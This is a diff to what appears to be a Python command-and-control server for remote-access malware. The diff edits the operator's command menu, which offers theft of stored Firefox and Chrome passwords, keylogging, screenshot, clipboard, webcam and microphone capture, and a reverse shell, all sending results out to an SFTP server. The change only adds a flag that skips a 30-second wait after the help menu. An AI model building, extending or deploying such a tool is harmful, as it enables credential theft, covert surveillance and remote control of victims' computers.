@@ -116,6 +116,7 @@ def create_command_file(ftps):
     shell = 0
     #take input from user
     while True:
+        hekk = 0
         file = open("commands.txt", "w")
         print("[+] Welcome to the interactive command shell!")
         print("[+] Please enter a command to execute on the client!")
@@ -129,15 +130,15 @@ def create_command_file(ftps):
             print("[+] get passwords: gets all the stored passwords from firefox and chrome (at least tries to) and sends them to the sftp server in keylogger.txt. Can be downloaded by get files command!")
             print("[+] get files: gets all the files from the sftp server and downloads them to the current directory!")
             print("[+] get keylogger: gets the keylogger information of the client and sends it to the sftp server. Can be downloaded by get files command!")
-            print("------------------------Only the above are working at the moment!------------------------")
             print("[+] get screenshot: takes a screenshot of the clients screen and sends it to the sftp server. Can be downloaded by get files command!")
+            print("------------------------Only the above are working at the moment!------------------------")
             print("[+] get clipboard: gets the clipboard content of the client and sends it to the sftp server. Can be downloaded by get files command!")
             print("[+] get webcam: gets the webcam content of the client and sends it to the sftp server. Can be downloaded by get files command!")
             print("[+] get microphone: gets the microphone content of the client and sends it to the sftp server. Can be downloaded by get files command!")
             print("[+] get system info: gets the system information of the client and sends it to the sftp server. Can be downloaded by get files command!")
             print("[+] get process: gets the process information of the client and sends it to the sftp server. Can be downloaded by get files command!")
             print("[+] exit = exit")
-            command = input("Enter command: ")
+            hekk = 1
         elif (command == "reverse_shell"):
             file.write("reverse_shell ")
             #server ip:
@@ -197,10 +198,13 @@ def create_command_file(ftps):
         time.sleep(2)
         #remove commands.txt file
         os.remove("commands.txt")
-        for i in range(30, 0, -1):
-            print("[+] " + str(i) + " seconds left until next command!")
-            time.sleep(1)
-            os.system('cls' if os.name == 'nt' else 'clear')
+        if hekk == 0:
+            for i in range(30, 0, -1):
+                print("[+] " + str(i) + " seconds left until next command!")
+                time.sleep(1)
+                os.system('cls' if os.name == 'nt' else 'clear')
+        else: 
+            continue
 
 
 #------------------------Command and Control Server Main------------------------
